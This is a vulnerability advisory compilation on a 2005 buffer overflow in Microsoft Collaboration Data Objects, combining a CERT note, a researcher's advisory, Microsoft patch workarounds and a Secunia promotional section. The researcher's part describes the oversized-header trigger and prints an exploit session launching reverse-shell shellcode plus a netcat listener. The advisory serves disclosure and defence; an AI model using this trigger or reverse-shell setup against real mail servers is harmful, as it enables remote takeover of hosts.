## Microsoft Collaboration Data Objects buffer overflow

#### Vulnerability Note VU#883460

Original Release Date: 2005-10-11 | Last Revised: 2005-10-14

---

### Overview

A buffer overflow in Microsoft Collaboration Data Objects may allow a remote, unauthenticated attacker to execute arbitrary code on a vulnerable system.

### Description

| Microsoft Collaboration Data Objects (CDO) is a scripting library used to develop applications that handle email. Note that CDO is commonly associated with cdosys.dll and codex.dll. An input validation error in CDO may allow a buffer overflow to occur in applications or components that use CDO. If a remote, unauthenticated attacker supplies an application or component that uses CDO with a specially crafted message, that attacker may be able to trigger the buffer overflow and, consequently, execute arbitrary code.  For more information, including a list of affected software, please see [MS05-048](http://www.microsoft.com/technet/security/Bulletin/MS05-048.mspx). Please note that exploit code for this vulnerability is publicly available. |
| --- |

### Impact

| If a remote attacker supplies an application that uses CDO with a specially crafted message, that attacker may be able execute arbitrary code on a vulnerable system. |
| --- |

### Solution

| **Apply an update**  Microsoft has addressed this issue in Microsoft Security Bulletin [MS05-048](http://www.microsoft.com/technet/security/Bulletin/MS05-048.mspx).In addition, MS05-048 suggests the following workarounds: |
| --- |

| **Disable event sinks on Exchange 2000 Server and on servers that are running IIS**  Disabling all event sinks will help protect the affected system from attempts to exploit this vulnerability. For instructions on how to disable event sinks, please refer to MS05-048. **Unregister cdoex.dll file and the cdosys.dll** Unregistering cdoex.dll and cdosys.dll will will reduce the chances of exploitation. Again, for instructions on how to unregister DLLs, please refer to MS05-048. |

       Author: 	Gary O'leary-Steele
Vendor Status: 	Patch Released
CVE Candidate: 	CAN-2005-1987
    Reference:	<http://www.sec-1.com>
    Disclosed:	12/October/2005

Vulnerability Details:

Sec-1 has identified an exploitable Buffer Overflow within Collaboration
Data Objects (Cdosys.dll and Cdoex.dll). The vulnerability exists when
event sinks are used within Microsoft Exchange 2000 or Microsoft Mail
services to parse e-mail content. Several Content Security packages
were identified to be vulnerable/exploitable.

The vulnerability can be exploited by crafting an e-mail with a large
header name such as "Content-Type<LARGE STRING>:".
A failure to correctly determine the length of the string results in a
stack overflow. Successful exploitation of the vulnerability could allow
the attacker to gain complete control of the vulnerable host. Under
certain conditions the vulnerability can also be used to bypass content
security mechanisms such as virus and content security scanners. Proof
of
concept code to recreate the problem is included at the bottom of this
advisory.

Exploit Availability:

Sec-1 do not release exploit code to the general public.
Attendees of the Sec-1 Applied Hacking & Intrusion prevention course
will receive a copy of this exploit as part of the Sec-1 Exploit
Arsenal.
See: <http://www.sec-1.com/applied_hacking_course.html>

Exploit Example:

[root@homer PoC]# perl cdo.pl -f me@test.com -t me@test.com -h 10.0.0.53

Enter IP address of your attacking host: 10.0.0.200
Enter Port for shellcode to connect back on: 80

[*]----Connected OK!
[*]----Sending MAIL FROM: me@test.com
[*]----Sending RCPT TO: <me@test.com>
[*]----Sending Malformed E-mail body
[*]----Shellcode Length: 316
[*]----Shellcode type: Reverse shell
[*]----Done.

[!]	Note this may take a while. Inetinfo will crash and restart
	This will happen until a nops are reached. You may also want
	to clear the queue to restore Inetinfo.exe by deleting malformed

	e-mail from c:\Inetpub\mailroot\Queue

[root@homer PoC]# nc -l -p 80 -v
listening on [any] 80 ...

## Vulnerability Details

#### Collaboration Data Objects Vulnerability - CAN-2005-1987

A remote code execution vulnerability exists in Collaboration Data Objects that could allow an attacker who successfully exploited this vulnerability to take complete control of the affected system.

#### Mitigating Factors for Collaboration Data Objects Vulnerability - CAN-2005-1987:

* By default, Microsoft Internet Information Services (IIS) 5.0 Simple Mail Transfer Protocol (SMTP) and the Exchange 2000 Server SMTP service do not use the event sinks, which use the Cdosys.dll file and the Cdoex.dll file.
* By default, IIS 6.0 is not enabled on Windows Server 2003.
* IIS 6.0, when enabled, does not enable SMTP by default.

#### Workarounds for Collaboration Data Objects Vulnerability - CAN-2005-1987:

Microsoft has tested the following workarounds. While these workarounds will not correct the underlying vulnerability, they help block known attack vectors. When a workaround reduces functionality, it is identified in the following section.

* **Disable all event sinks that are enabled on Exchange 2000 Server and on servers that are running IIS:**

  Disabling all event sinks will help protect the affected system from attempts to exploit this vulnerability. To disable the any custom or third-party event sinks, follow these steps:

  1. Use the **cscript.exe smtpreg.vbs /enum** command-line command to enumerate all the registered event sinks. Examine the output of this command and look for custom or non-Microsoft software event sink entries.
  2. After you identify the event sink that you want to disable, run the following command at a command prompt:

     **cscript.exe smtpreg.vbs /disable**

  **Impact of Workaround:** The custom or third-party application that has created the event sink in the SMTP service will not work correctly until the event sink is re-enabled.
* **Unregister the Cdoex.dll file and the Cdosys.dll file on Exchange 2000 Server and unregister the Cdosys.dll file on servers that are running IIS:**

  Unregistering the Cdoex.dll file and the Cdosys.dll file helps protect the affected system from attempts to exploit this vulnerability.

  To disable the Cdoex.dll file and the Cdosys.dll file for Exchange 2000 Server, follow these steps.

  **Important** You must follow these steps in the following order.

  1. Run the following command at a command prompt:

     **Regsvr32.exe âC:\Program Files\Common Files\Microsoft Shared\CDO\cdoex.dllâ /u**
  2. Run the following command at a command prompt:

     **Regsvr32.exe %windir%\system32\cdosys.dll /u**

  To disable the Cdosys.dll file for servers that are running IIS, type the following command at a command prompt:

  1. **Regsvr32.exe %windir%\system32\cdosys.dll /u**

**Deployment Information**

To install the security update without any user intervention, use the following command at a command prompt for Windows 2000 Service Pack 4:

**Windows2000-kb901017-x86-enu /quiet**

**Note** Use of the **/quiet** switch will suppress all messages. This includes suppressing failure messages. Administrators should use one of the supported methods to verify the installation was successful when they use the **/quiet** switch. Administrators should also review the KB901017.log file for any failure messages when they use this switch.

To install the security update without forcing the system to restart, use the following command at a command prompt for Windows 2000 Service Pack 4:

**Windows2000-kb901017-x86-enu /norestart**

For more information about how to deploy this security update with Software Update Services, visit the [Software Update Services Web site](https://go.microsoft.com/fwlink/?linkid=21125). For more information about how to deploy this security update using Windows Server Update Services, visit the [Windows Server Update Services Web site](https://go.microsoft.com/fwlink/?linkid=50120). This security update will also be available through the [Microsoft Update Web site](https://update.microsoft.com/microsoftupdate).

**Restart Requirement**

This update does not require a restart. The installer stops the required services, applies the update, and then restarts the services. However, if the required services cannot be stopped for any reason, or if required files are being used, this update will require a restart. If this behavior occurs, a message appears that advises you to restart.

**Removal Information**

To remove this security update, use the Add or Remove Programs tool in Control Panel.

System administrators can also use the Spuninst.exe utility to remove this security update. The Spuninst.exe utility is located in the %Windir%\$NTUninstallKB901017$\Spuninst folder.

  1. Click **Start**, and then click **Search**.
  2. In the **Search Results** pane, click **All files and folders** under **Search Companion**.
  3. In the **All or part of the file name** box, type a file name from the appropriate file information table, and then click **Search**.
  4. In the list of files, right-click a file name from the appropriate file information table, and then click **Properties**.
     **Note** Depending on the version of the operating system or programs installed, some of the files that are listed in the file information table may not be installed.
  5. On the **Version** tab, determine the version of the file that is installed on your computer by comparing it to the version that is documented in the appropriate file information table.
     **Note** Attributes other than the file version may change during installation. Comparing other file attributes to the information in the file information table is not a supported method of verifying that the update has been applied. Also, in certain cases, files may be renamed during installation. If the file or version information is not present, use one of the other available methods to verify update installation.
* **Registry Key Verification**

  You may also be able to verify the files that this security update has installed by reviewing the following registry keys.

  HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Updates\Windows 2000\SP5\KB901017\Filelist

  **Note** These registry keys may not contain a complete list of installed files. Also, these registry keys may not be created correctly if an administrator or an OEM integrates or slipstreams the 900725 security update into the Windows installation source files.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
